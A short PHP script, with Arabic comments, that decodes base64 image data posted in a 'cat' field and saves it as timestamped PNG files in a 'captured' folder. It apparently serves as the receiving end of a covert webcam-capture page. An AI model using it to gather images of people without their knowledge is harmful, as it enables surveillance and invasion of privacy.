<?php
$date = date('dMy_H.i.s');
$imageData = $_POST['cat'];

if (!empty($imageData)) {
    // إزالة تعريف البيانات من النص المستلم
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    // حفظ الملف
    $fp = fopen('captured/cam' . $date . '.png', 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);
}
exit();
?>
